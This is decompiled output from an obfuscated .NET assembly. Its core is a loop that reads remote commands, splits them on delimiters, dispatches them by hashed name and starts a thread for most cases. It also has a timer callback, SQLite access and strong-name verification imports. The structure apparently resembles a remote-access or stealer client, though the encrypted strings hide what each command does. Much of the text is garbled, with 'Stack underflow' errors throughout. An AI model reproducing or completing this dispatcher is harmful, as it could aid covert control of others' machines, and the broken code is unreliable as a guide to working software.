				else if (item._0001 == _0080._0014._0001(107361606))
				{
					uint num4 = _0018._0001(binaryReader.ReadBytes(4));
					_0018._0001(binaryReader.ReadBytes(4));
					_0003 = item._0002 + 16 + num4;
					_0005 = (int)(item._0001 - 8);
					binaryReader.BaseStream.Position += item._0001 - 8;
				}
				else
				{
					_0006?.Add(item);
					binaryReader.BaseStream.Position += item._0001;
				}
			}
			if (_0002 == null)
			{
				throw new FormatException(_0080._0014._0001(107361629));
			}
			if (_0003 == -1)
			{
				throw new FormatException(_0080._0014._0001(107361540));
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_column_bytes")]
		static extern int _0001(IntPtr _0002, int _0003);

		static void _0001(int _0002, global::_0017._007F._000F P_1)
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_001f: Incompatible stack heights: 0 vs 1
			//IL_0022: Incompatible stack heights: 0 vs 1
			_003F val = /*Error near IL_000a: Stack underflow*/& 0xFF;
			((Stream)/*Error near IL_0029: Stack underflow*/).WriteByte((byte)val);
			P_1.WriteByte((byte)((uint)(_0002 >> 8) & 0xFFu));
		}

		static bool _0001(global::_0003._000F _0002, global::_0007._0014 _0003, [Out] global::_0005._0005 _0004, ref global::_0002._0005 P_3)
		{
			//IL_00a1: Incompatible stack heights: 0 vs 1
			//IL_00ab: Incompatible stack heights: 0 vs 1
			_0018._0001((global::_0007._0014)/*Error near IL_00ab: Stack underflow*/);
			IntPtr intPtr;
			if (6u != 0)
			{
				intPtr = (IntPtr)/*Error near IL_00b1: Stack underflow*/;
			}
			P_3 = null;
			int num = _0003._0001._0001(_0002, _0004, intPtr);
			IntPtr intPtr2 = global::_0004._000F._0001<IntPtr>(intPtr);
			if (_0090_0002._0099_0005(intPtr2, IntPtr.Zero))
			{
				P_3 = global::_0004._000F._0001<global::_0002._0005>(intPtr2);
				_009B._0091_0004(intPtr2);
			}
			_009B._0090_0004(intPtr);
			switch (num)
			{
			case 0:
				return true;
			case 1:
				return false;
			case -2004287480:
				return _0002 != global::_0003._000F._0002;
			default:
				global::_0007._0097(num);
				throw new NotSupportedException(_0091_0003._008F_0007(_0080._0014._0001(107360971), num));
			}
		}

		static global::_0010._0019 _0001()
		{
			//IL_0016: Invalid comparison between Unknown and I4
			//IL_003a: Incompatible stack heights: 0 vs 3
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0048: Incompatible stack heights: 0 vs 1
			_ = global::_001A._007E_0010_0003;
			_ = _008E._007E_001A_0004;
			_008D._0019_0004();
			/*Error near IL_0041: Stack underflow*/((object)/*Error near IL_0041: Stack underflow*/);
			/*Error near IL_0048: Stack underflow*/((object)/*Error near IL_0048: Stack underflow*/);
			if ((int)/*Error near IL_0018: Stack underflow*/ < 6)
			{
				throw new NotSupportedException(_0080._0014._0001(107360978));
			}
			return _0018._0001(new _001F._0015(), global::_0016._0019._0001, _0019._0016._0001);
		}

		static void _0001(int _0002, global::_0013._0010 _0003, global::_0016._0014 P_2)
		{
			//IL_00e3: Incompatible stack heights: 0 vs 1
			//IL_00e9: Incompatible stack heights: 0 vs 1
			if (((global::_0016._0014)/*Error near IL_000a: Stack underflow*/)._0001 == 0)
			{
				if (7u != 0)
				{
					_0018._0001((global::_0016._0014)/*Error near IL_00f3: Stack underflow*/, 1);
				}
				P_2._0001[0].Add(_0003);
			}
			else if (_0002 == 0)
			{
				switch (_0003._0001)
				{
				case MidiCommandCode.NoteOff:
				case MidiCommandCode.NoteOn:
				case MidiCommandCode.KeyAfterTouch:
				case MidiCommandCode.ControlChange:
				case MidiCommandCode.PatchChange:
				case MidiCommandCode.ChannelAfterTouch:
				case MidiCommandCode.PitchWheelChange:
					_0018._0001(P_2, _0003.Channel + 1);
					P_2._0001[_0003.Channel].Add(_0003);
					break;
				default:
					_0018._0001(P_2, 1);
					P_2._0001[0].Add(_0003);
					break;
				}
			}
			else
			{
				_0018._0001(P_2, _0002 + 1);
				P_2._0001[_0002].Add(_0003);
			}
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(int _0002, _001C._0004 _0003, string _0004 = 192000)
		{
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			Guid guid = _001F._0011._0001;
			_ = ((_001C._0004)/*Error near IL_0052: Stack underflow*/).WaveFormat;
			global::_0005._0005 obj = (global::_0005._0005)/*Error near IL_000c: Stack underflow*/;
			MediaFoundationEncoder mediaFoundationEncoder = new MediaFoundationEncoder(_0018._0001(_0002, guid, obj) ?? throw new InvalidOperationException(_0080._0014._0001(107360913)));
			try
			{
				_0018._0001(_0004, _0003, mediaFoundationEncoder);
			}
			finally
			{
				if (mediaFoundationEncoder != null)
				{
					global::_0008._007E_0098(mediaFoundationEncoder);
				}
			}
		}

		static long _0001(int _0002, global::_0005._0005 _0003)
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_0012: Unknown result type (might be due to invalid IL or missing references)
			//IL_0014: Expected I8, but got Unknown
			//IL_0015: Incompatible stack heights: 0 vs 2
			//IL_0018: Incompatible stack heights: 0 vs 2
			_ = 10000000;
			long num = (long)/*Error near IL_0009: Stack underflow*/;
			_ = /*Error near IL_000a: Stack underflow*/* num;
			int num2 = ((global::_0005._0005)/*Error near IL_0011: Stack underflow*/)._0002;
			return /*Error near IL_0013: Stack underflow*// num2;
		}

		static void _0001(global::_0008._0001 P_0)
		{
			//IL_00af: Incompatible stack heights: 0 vs 1
			//IL_00b5: Incompatible stack heights: 0 vs 1
			//IL_00bf: Incompatible stack heights: 0 vs 1
			global::_0015._0001._0001 = global::_0015._0001._0001[0];
			new global::_0004._0001((global::_0008._0001)/*Error near IL_00bf: Stack underflow*/);
			((global::_0008._0001)/*Error near IL_0021: Stack underflow*/)._0001 = (global::_0004._0001)/*Error near IL_0021: Stack underflow*/;
			P_0._0001._0001 = _0016_0005._009F_000E();
			P_0._0001._0001 = P_0;
			_0018._0001();
			TimerCallback callback = P_0._0001;
			Timer timer = new Timer(callback, P_0._0001, 10112, 45612);
			P_0._0001._0001 = timer;
			global::_0007._0096(90);
			_0018._0001(P_0._0001);
			global::_0007._0096(210);
			_0018._0001(P_0._0001);
		}

		static void _0001(global::_0008._0001 P_0)
		{
			//IL_11be: Incompatible stack heights: 0 vs 1
			//IL_11ca: Incompatible stack heights: 0 vs 1
			bool flag = !((global::_0008._0001)/*Error near IL_000b: Stack underflow*/)._0002;
			if ((int)/*Error near IL_001d: Stack underflow*/ != 0)
			{
				global::_0008._0001._0003 obj = new global::_0008._0001._0003();
				obj._0001 = P_0;
				P_0._0002 = true;
				P_0._0001 = _0018._0001(P_0._0001, P_0._0001);
				P_0._0001 = false;
				global::_0008._0001._0005 CS_0024_003C_003E8__locals0;
				while (P_0._0007)
				{
					global::_0008._0001._0002 CS_0024_003C_003E8__locals1 = new global::_0008._0001._0002();
					CS_0024_003C_003E8__locals1._0001 = obj;
					CS_0024_003C_003E8__locals1._0001 = _0018._0001(P_0);
					if (CS_0024_003C_003E8__locals1._0001 == null)
					{
						P_0._0007 = false;
						break;
					}
					P_0._0006 = false;
					string text = CS_0024_003C_003E8__locals1._0001[0];
					text = ((global::_000E._007E_008A_0002(text, new char[1] { '-' }).Length <= 1) ? global::_000F._008B_0002(global::_000E._008A_0002(_0080._0014._0001(107360832), new char[1] { '!' })[0], text) : global::_000F._008B_0002(global::_000E._008A_0002(_0080._0014._0001(107360832), new char[1] { '!' })[0], global::_000E._007E_008A_0002(text, new char[1] { '-' })[1]));
					CS_0024_003C_003E8__locals1._0001._0001 = global::_000E._007E_008A_0002(text, new char[1] { '$' })[1];
					string text2 = text;
					uint num = _0018._0001(text2);
					if (num <= 1964875786)
					{
						if (num <= 1145845401)
						{
							if (num <= 691882994)
							{
								if (num <= 194956622)
								{
									if (num == 189312435)
									{
										if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360272)))
										{
											P_0._0001 = false;
										}
										continue;
									}
									if (num != 194956622 || !_0010_0003._008B_0006(text2, _0080._0014._0001(107362286)))
									{
										continue;
									}
								}
								else
								{
									if (num == 496124990)
									{
										if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360658)))
										{
											_0018._0001(P_0._0001, (int)_0017_0005._0001_000F(global::_0002._007E_000F(global::_000E._007E_008A_0002(CS_0024_003C_003E8__locals1._0001[1], new char[1] { '|' })[0])));
										}
										continue;
									}
									if (num != 671669610)
									{
										if (num != 691882994 || !_0010_0003._008B_0006(text2, _0080._0014._0001(107361204)))
										{
											continue;
										}
										global::_0008._0001._0004 CS_0024_003C_003E8__locals2 = new global::_0008._0001._0004();
										CS_0024_003C_003E8__locals2._0001 = CS_0024_003C_003E8__locals1;
										CS_0024_003C_003E8__locals2._0001 = _0018._0001(P_0._0001, CS_0024_003C_003E8__locals2._0001._0001[1]);
										if (_0010_0003._008C_0006(CS_0024_003C_003E8__locals2._0001, _0080._0014._0001(107396634)))
										{
											P_0._0001 = delegate
											{
												//IL_004e: Incompatible stack heights: 0 vs 1
												//IL_0055: Incompatible stack heights: 0 vs 4
												//IL_0058: Incompatible stack heights: 0 vs 1
												_ = ((global::_0008._0001._0004)/*Error near IL_0008: Stack underflow*/)._0001._0001._0001;
												_ = null;
												_ = _0084._000F_0004;
												_0080._0014._0001(107397018);
												string text16 = ((global::_0008._0001._0004)/*Error near IL_0026: Stack underflow*/)._0001._0001._0001;
												string text17 = _0080._0014._0001(107396973);
												string text18 = CS_0024_003C_003E8__locals2._0001;
												string text19 = /*Error near IL_0045: Stack underflow*/((string)/*Error near IL_0045: Stack underflow*/, text16, text17, text18);
												_0018._0001((global::_0008._0001)/*Error near IL_004b: Stack underflow*/, (byte[])/*Error near IL_004b: Stack underflow*/, text19, false);
											};
											P_0._0001 = new Thread(P_0._0001);
											global::_0008._007E_0002_0002(P_0._0001);
										}
										continue;
									}
									if (!_0010_0003._008B_0006(text2, _0080._0014._0001(107362297)))
									{
										continue;
									}
								}
							}
							else
							{
								if (num <= 895346220)
								{
									switch (num)
									{
									case 895346220u:
										if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360818)))
										{
											P_0._0001 = delegate
											{
												//IL_0023: Incompatible stack heights: 0 vs 1
												//IL_0029: Incompatible stack heights: 0 vs 1
												global::_0008._0001 obj8 = ((global::_0008._0001._0002)/*Error near IL_0008: Stack underflow*/)._0001._0001;
												string text11 = ((global::_0008._0001._0002)/*Error near IL_0016: Stack underflow*/)._0001[1];
												_0018._0001(text11, obj8);
											};
											P_0._0001 = new Thread(P_0._0001);
											global::_0008._007E_0002_0002(P_0._0001);
										}
										break;
									case 835892280u:
										if (_0010_0003._008B_0006(text2, _0080._0014._0001(107361141)) && global::_000E._007E_008A_0002(CS_0024_003C_003E8__locals1._0001[1], new char[1] { '|' }).Length == 2)
										{
											CS_0024_003C_003E8__locals1._0001._0002 = global::_000E._007E_008A_0002(CS_0024_003C_003E8__locals1._0001[1], new char[1] { '|' })[0];
											CS_0024_003C_003E8__locals1._0001._0001 = _0093_0003._0092_0007(global::_000E._007E_008A_0002(CS_0024_003C_003E8__locals1._0001[1], new char[1] { '|' })[1]);
											P_0._0001 = delegate
											{
												//IL_001e: Incompatible stack heights: 0 vs 1
												//IL_0021: Incompatible stack heights: 0 vs 2
												//IL_0024: Incompatible stack heights: 0 vs 2
												_ = ((global::_0008._0001._0003)/*Error near IL_0008: Stack underflow*/)._0001;
												_ = ((global::_0008._0001._0003)/*Error near IL_000f: Stack underflow*/)._0002;
												int num2 = ((global::_0008._0001._0003)/*Error near IL_0016: Stack underflow*/)._0001;
												((global::_0008._0001)/*Error near IL_001b: Stack underflow*/)._0001((string)/*Error near IL_001b: Stack underflow*/, num2);
											};
											P_0._0001 = new Thread(P_0._0001);
											global::_0008._007E_0002_0002(P_0._0001);
										}
										break;
									case 708910876u:
									{
										if (!_0010_0003._008B_0006(text2, _0080._0014._0001(107360492)))
										{
											break;
										}
										CS_0024_003C_003E8__locals0 = new global::_0008._0001._0005();
										CS_0024_003C_003E8__locals0._0001 = CS_0024_003C_003E8__locals1;
										global::_0016._0001 obj2 = P_0._0001;
										string text3 = CS_0024_003C_003E8__locals0._0001._0001[1];
										CS_0024_003C_003E8__locals0._0001 = _0018._0001(text3, obj2);
										if (_0010_0003._008C_0006(CS_0024_003C_003E8__locals0._0001, _0080._0014._0001(107396634)))
										{
											P_0._0001 = delegate
											{
												//IL_004e: Incompatible stack heights: 0 vs 1
												//IL_0055: Incompatible stack heights: 0 vs 4
												//IL_0058: Incompatible stack heights: 0 vs 1
												_ = ((global::_0008._0001._0005)/*Error near IL_0008: Stack underflow*/)._0001._0001._0001;
												_ = null;
												_ = _0084._000F_0004;
												_0080._0014._0001(107397018);
												string text12 = ((global::_0008._0001._0005)/*Error near IL_0026: Stack underflow*/)._0001._0001._0001;
												string text13 = _0080._0014._0001(107396973);
												string text14 = CS_0024_003C_003E8__locals0._0001;
												string text15 = /*Error near IL_0045: Stack underflow*/((string)/*Error near IL_0045: Stack underflow*/, text12, text13, text14);
												_0018._0001((global::_0008._0001)/*Error near IL_004b: Stack underflow*/, (byte[])/*Error near IL_004b: Stack underflow*/, text15, false);
											};
											P_0._0001 = new Thread(P_0._0001);
											global::_0008._007E_0002_0002(P_0._0001);
										}
										break;
									}
									}
									continue;
								}
								if (num != 971238451)
								{
									switch (num)
									{
									case 1140028993u:
										if (_0010_0003._008B_0006(text2, _0080._0014._0001(107361183)))
										{
											_0018._0001(P_0, (byte[])null, global::_000F._008B_0002(global::_0002._007E_0006(_0080._0014._0001(107360513)), global::_0002._007E_0006(_0018._0001())), false);
										}
										break;
									case 1145845401u:
										if (_0010_0003._008B_0006(text2, _0080._0014._0001(107361025)))
										{
											_0018._0001(P_0._0001);
										}
										break;
									}
									continue;
								}
								if (!_0010_0003._008B_0006(text2, _0080._0014._0001(107362230)))
								{
									continue;
								}
							}
						}
						else
						{
							if (num <= 1447775767)
							{
								switch (num)
								{
								case 1394871579u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360797)))
									{
										P_0._0001 = null;
										P_0._0001 = null;
									}
									break;
								case 1447775767u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107361193)))
									{
										_0018._0001(P_0._0001, global::_0002._007E_0006(global::_000E._007E_008A_0002(CS_0024_003C_003E8__locals1._0001[1], new char[1] { '>' })[0]));
									}
									break;
								case 1335474995u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107361078)))
									{
										_0018._0001(P_0._0001);
									}
									break;
								case 1328863054u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360387)))
									{
										P_0._0008 = true;
										P_0._0006 = true;
										P_0._0001 = false;
									}
									break;
								case 1309944183u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360580)))
									{
										_0018._0001(P_0, CS_0024_003C_003E8__locals1._0001[1]);
									}
									break;
								case 1229460501u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360566)))
									{
										P_0._0001 = delegate
										{
											//IL_0008: Incompatible stack heights: 0 vs 1
											_0018._0001((global::_0008._0001)/*Error near IL_000f: Stack underflow*/);
										};
										P_0._0001 = new Thread(P_0._0001);
										global::_0008._007E_0002_0002(P_0._0001);
									}
									break;
								}
								continue;
							}
							if (num > 1654695744)
							{
								switch (num)
								{
								case 1776594748u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107361088)))
									{
										_0018._0001(P_0._0001);
									}
									break;
								case 1699653923u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107361067)))
									{
										_0018._0001(P_0._0001);
									}
									break;
								case 1964875786u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360450)))
									{
										P_0._0001 = delegate
										{
											//IL_0023: Incompatible stack heights: 0 vs 1
											//IL_0029: Incompatible stack heights: 0 vs 1
											global::_0008._0001 obj7 = ((global::_0008._0001._0002)/*Error near IL_0008: Stack underflow*/)._0001._0001;
											string text10 = ((global::_0008._0001._0002)/*Error near IL_0016: Stack underflow*/)._0001[1];
											_0018._0001(text10, obj7);
										};
										P_0._0001 = new Thread(P_0._0001);
										global::_0008._007E_0002_0002(P_0._0001);
									}
									break;
								}
								continue;
							}
							if (num == 1492396964)
							{
								if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360555)))
								{
									P_0._0001._0001(CS_0024_003C_003E8__locals1._0001[1]);
								}
								continue;
							}
							if (num != 1572346446)
							{
								if (num != 1654695744 || !_0010_0003._008B_0006(text2, _0080._0014._0001(107362156)))
								{
									continue;
								}
							}
							else if (!_0010_0003._008B_0006(text2, _0080._0014._0001(107360710)))
							{
								continue;
							}
						}
					}
					else if (num <= 2860610557u)
					{
						if (num <= 2457719218u)
						{
							if (num > 2404742552u)
							{
								switch (num)
								{
								case 2457719218u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107361246)))
									{
										_0018._0001(P_0);
									}
									break;
								case 2420619098u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360324)))
									{
										P_0._0002(CS_0024_003C_003E8__locals1._0001[1]);
									}
									break;
								case 2418021207u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360700)))
									{
										P_0._0001 = delegate
										{
											//IL_0023: Incompatible stack heights: 0 vs 1
											//IL_0029: Incompatible stack heights: 0 vs 1
											global::_0008._0001 obj6 = ((global::_0008._0001._0002)/*Error near IL_0008: Stack underflow*/)._0001._0001;
											string text9 = ((global::_0008._0001._0002)/*Error near IL_0016: Stack underflow*/)._0001[1];
											_0018._0001(text9, obj6);
										};
										P_0._0001 = new Thread(P_0._0001);
										global::_0008._007E_0002_0002(P_0._0001);
									}
									break;
								}
								continue;
							}
							if (num == 2029703535)
							{
								if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360440)))
								{
									P_0._0001 = delegate
									{
										//IL_001e: Incompatible stack heights: 0 vs 1
										//IL_0021: Incompatible stack heights: 0 vs 3
										//IL_0028: Incompatible stack heights: 0 vs 1
										_ = ((global::_0008._0001._0003)/*Error near IL_0008: Stack underflow*/)._0001;
										_ = global::_0002._007E_0006;
										string text8 = ((global::_0008._0001._0003)/*Error near IL_0014: Stack underflow*/)._0001;
										/*Error near IL_0028: Stack underflow*/(text8);
										_0018._0001((global::_0008._0001)/*Error near IL_001b: Stack underflow*/, (string)/*Error near IL_001b: Stack underflow*/);
									};
									P_0._0001 = new Thread(P_0._0001);
									global::_0008._007E_0002_0002(P_0._0001);
								}
								continue;
							}
							if (num == 2335124671u)
							{
								if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360366)))
								{
									_0018._0001(P_0._0001);
								}
								continue;
							}
							if (num != 2404742552u || !_0010_0003._008B_0006(text2, _0080._0014._0001(107362219)))
							{
								continue;
							}
						}
						else
						{
							if (num <= 2708024234u)
							{
								switch (num)
								{
								case 2497929005u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360303)))
									{
										P_0._0001 = true;
										P_0._0001 = delegate
										{
											//IL_0023: Incompatible stack heights: 0 vs 1
											//IL_0029: Incompatible stack heights: 0 vs 1
											global::_0008._0001 obj5 = ((global::_0008._0001._0002)/*Error near IL_0008: Stack underflow*/)._0001._0001;
											string text7 = ((global::_0008._0001._0002)/*Error near IL_0016: Stack underflow*/)._0001[1];
											_0018._0001(text7, obj5);
										};
										P_0._0001 = new Thread(P_0._0001);
										global::_0008._007E_0002_0002(P_0._0001);
									}
									break;
								case 2708024234u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360721)))
									{
										_0018._0001(P_0._0001);
									}
									break;
								case 2552807326u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360647)))
									{
										_0018._0001(P_0, CS_0024_003C_003E8__locals1._0001[1]);
									}
									break;
								}
								continue;
							}
							if (num != 2744991453u)
							{
								switch (num)
								{
								case 2860610557u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360429)))
									{
										_0018._0001(P_0._0001);
									}
									break;
								case 2752327022u:
									if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360377)))
									{
										P_0._0001 = delegate
										{
											//IL_0014: Incompatible stack heights: 0 vs 1
											//IL_0017: Incompatible stack heights: 0 vs 2
											_ = ((global::_0008._0001._0003)/*Error near IL_0008: Stack underflow*/)._0001;
											string text6 = ((global::_0008._0001._0003)/*Error near IL_000f: Stack underflow*/)._0001;
											((global::_0008._0001)/*Error near IL_001e: Stack underflow*/)._0001(text6);
										};
										P_0._0001 = new Thread(P_0._0001);
										global::_0008._007E_0002_0002(P_0._0001);
									}
									break;
								}
								continue;
							}
							if (!_0010_0003._008B_0006(text2, _0080._0014._0001(107362114)))
							{
								continue;
							}
						}
					}
					else if (num <= 3366806400u)
					{
						if (num <= 2941577984u)
						{
							if (num == 2888359706u)
							{
								if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360314)))
								{
									_0018._0001(P_0, CS_0024_003C_003E8__locals1._0001[1]);
								}
								continue;
							}
							if (num != 2912791961u)
							{
								if (num != 2941577984u || !_0010_0003._008B_0006(text2, _0080._0014._0001(107361130)))
								{
									continue;
								}
								P_0._0001 = delegate
								{
									//IL_002a: Incompatible stack heights: 0 vs 1
									//IL_0030: Incompatible stack heights: 0 vs 1
									global::_0016._0001 obj3 = ((global::_0008._0001._0002)/*Error near IL_0008: Stack underflow*/)._0001._0001._0001;
									global::_0016._0001 obj4 = default(global::_0016._0001);
									if (0 == 0)
									{
										obj4 = obj3;
									}
									string text5 = ((global::_0008._0001._0002)/*Error near IL_001d: Stack underflow*/)._0001[1];
									_0018._0001(text5, obj4);
								};
								P_0._0001 = new Thread(P_0._0001);
								global::_0008._007E_0002_0002(P_0._0001);
								continue;
							}
							if (!_0010_0003._008B_0006(text2, _0080._0014._0001(107362240)))
							{
								continue;
							}
						}
						else
						{
							if (num == 2953829030u)
							{
								if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360261)))
								{
									P_0._0001 = new Thread((ThreadStart)P_0._0001);
									global::_0008._007E_0002_0002(P_0._0001);
								}
								continue;
							}
							if (num == 3352229705u)
							{
								if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360807)))
								{
									P_0._0001._0001 = _0016_0005._009F_000E();
								}
								continue;
							}
							if (num != 3366806400u || !_0010_0003._008B_0006(text2, _0080._0014._0001(107362177)))
							{
								continue;
							}
						}
					}
					else
					{
						if (num <= 3537822380u)
						{
							switch (num)
							{
							case 3490317333u:
								if (_0010_0003._008B_0006(text2, _0080._0014._0001(107361256)))
								{
									_0018._0001(P_0, CS_0024_003C_003E8__locals1._0001[1]);
								}
								break;
							case 3370747971u:
								if (_0010_0003._008B_0006(text2, _0080._0014._0001(107361267)))
								{
									_0018._0001(P_0._0001);
								}
								break;
							case 3537822380u:
								if (_0010_0003._008B_0006(text2, _0080._0014._0001(107360637)))
								{
									P_0._0001 = delegate
									{
										//IL_0008: Incompatible stack heights: 0 vs 1
										_0018._0001((global::_0008._0001)/*Error near IL_000f: Stack underflow*/);
									};
									P_0._0001 = new Thread(P_0._0001);
									global::_0008._007E_0002_0002(P_0._0001);
								}
								break;
							}
							continue;
						}
						if (num != 3540061156u)
						{
							if (num != 4091613627u)
							{
								if (num == 4147671038u && _0010_0003._008B_0006(text2, _0080._0014._0001(107360503)))
								{
									P_0._0001 = delegate
									{
										//IL_0014: Incompatible stack heights: 0 vs 1
										//IL_0017: Incompatible stack heights: 0 vs 2
										_ = ((global::_0008._0001._0003)/*Error near IL_0008: Stack underflow*/)._0001;
										string text4 = ((global::_0008._0001._0003)/*Error near IL_000f: Stack underflow*/)._0001;
										((global::_0008._0001)/*Error near IL_001e: Stack underflow*/)._0001(text4);
									};
									P_0._0001 = new Thread(P_0._0001);
									global::_0008._007E_0002_0002(P_0._0001);
								}
								continue;
							}
							if (!_0010_0003._008B_0006(text2, _0080._0014._0001(107360763)))
							{
								continue;
							}
						}
						else if (!_0010_0003._008B_0006(text2, _0080._0014._0001(107362167)))
						{
							continue;
						}
					}
					_0018._0001(P_0._0001, text, CS_0024_003C_003E8__locals1._0001[1]);
				}
				P_0._0007 = false;
				P_0._0001 = false;
			}
			P_0._0002 = false;
		}

		static string _0001(string _0002, string _0003)
		{
			//IL_0091: Incompatible stack heights: 0 vs 2
			//IL_009b: Incompatible stack heights: 0 vs 1
			//IL_00a1: Incompatible stack heights: 0 vs 2
			_ = global::_001C._0096_0003;
			/*Error near IL_009b: Stack underflow*/((string)/*Error near IL_009b: Stack underflow*/);
			if ((int)/*Error near IL_0014: Stack underflow*/ == 0)
			{
				_ = global::_001C._0096_0003;
				if (!/*Error near IL_0023: Stack underflow*/((string)/*Error near IL_0023: Stack underflow*/))
				{
					try
					{
						string text = global::_001E._0099_0003(_0003);
						if (global::_001C._0096_0003(text))
						{
							return _0002;
						}
						_0002 = global::_0003._007E_0080(_0002, global::_0017._0084._0005, text);
						return _0002;
					}
					catch (Exception ex)
					{
						try
						{
							_0015_0004._001E_0008(_0018._0001((IFormatProvider)_008F_0003._008C_0007(), _0080._0014._0001(107359980), new object[2] { _0003, ex }));
							return _0002;
						}
						catch
						{
							return _0002;
						}
					}
				}
			}
			return _0002;
		}

		static int _0001(_001D._0010 _0002, [Out] int _0003, ref int P_2)
		{
			//IL_0066: Incompatible stack heights: 0 vs 1
			//IL_007c: Incompatible stack heights: 0 vs 1
			_0018._0001((_001D._0010)/*Error near IL_0086: Stack underflow*/);
			try
			{
				((_001D._0010)/*Error near IL_000e: Stack underflow*/)._0001._0002 = _0003;
				_0002._0001._0003 = _0003;
				_007F._0005 obj = (_0002._0001 ? (_007F._0005._0001 | _007F._0005._0002) : _007F._0005._0001);
				_0018._0001(_0018._0001(_0002._0001, _0002._0001, obj), _0080._0014._0001(107359899));
				_0002._0001 = false;
				P_2 = _0002._0001._0003;
			}
			finally
			{
				_0018._0001(_0002);
			}
			return _0002._0001._0005;
		}

		unsafe static void _0001(out int _0002, out int _0003, out int _0004, out int _0005)
		{
			//IL_0069: Incompatible stack heights: 0 vs 1
			//IL_0070: Incompatible stack heights: 0 vs 2
			//IL_0077: Incompatible stack heights: 0 vs 1
			_ = _009C_0004._0084_000E;
			_0091._0080_0004(typeof(global::_0017._0084._0082).TypeHandle);
			/*Error near IL_0077: Stack underflow*/((Type)/*Error near IL_0077: Stack underflow*/);
			*(_003F*)(nint)/*Error near IL_0016: Stack underflow*/ = /*Error near IL_0016: Stack underflow*/;
			_0003 = _009C_0004._0084_000E(_0091._0080_0004(typeof(global::_0017._0084._007F).TypeHandle));
			_0002 = _009C_0004._0084_000E(_0091._0080_0004(typeof(global::_0017._0084._0080).TypeHandle));
			_0005 = _009C_0004._0084_000E(_0091._0080_0004(typeof(global::_0017._0084._0081).TypeHandle));
		}

		static void _0001(int _0002, global::_0012._0002 _0003, int P_2)
		{
			//IL_0003: Invalid comparison between Unknown and I4
			//IL_000e: Invalid comparison between Unknown and I4
			//IL_004c: Incompatible stack heights: 0 vs 1
			//IL_004f: Incompatible stack heights: 0 vs 1
			//IL_0052: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0005: Stack underflow*/ >= 0)
			{
				int num = ((global::_0012._0002)/*Error near IL_000e: Stack underflow*/)._0002;
				if ((int)/*Error near IL_0010: Stack underflow*/ < num)
				{
					if (_0002 < 0 || _0002 >= _0003._0001)
					{
						throw new ArgumentException(_0080._0014._0001(107359813));
					}
					_0003._0001[_0002] = P_2;
					return;
				}
			}
			throw new ArgumentException(_0080._0014._0001(107359842));
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0010._001C P_0)
		{
			//IL_000a: Incompatible stack heights: 0 vs 1
			((global::_0010._001C)/*Error near IL_0008: Stack underflow*/)._0001 = null;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0018._0003 _0001(_001B._0001 _0002, int P_1)
		{
			//IL_0003: Invalid comparison between Unknown and I4
			//IL_0013: Invalid comparison between Unknown and I4
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_0005: Stack underflow*/ >= 0)
			{
				uint num = ((_001B._0001)/*Error near IL_000e: Stack underflow*/)._0001._0003;
				if ((int)/*Error near IL_0015: Stack underflow*/ < (int)num)
				{
					return new global::_0018._0003(_0002._0001, P_1, _0002._0001);
				}
			}
			throw new ArgumentOutOfRangeException(_0080._0014._0001(107359780));
		}

		static void _0001(global::_000E._0001[] _0002, global::_000F._0003 P_1)
		{
			//IL_0085: Incompatible stack heights: 0 vs 1
			//IL_008b: Incompatible stack heights: 0 vs 2
			for (int i = 0; i < ((global::_0016._0002<global::_0018._0006>)P_1)._0001.Count - 1; i++)
			{
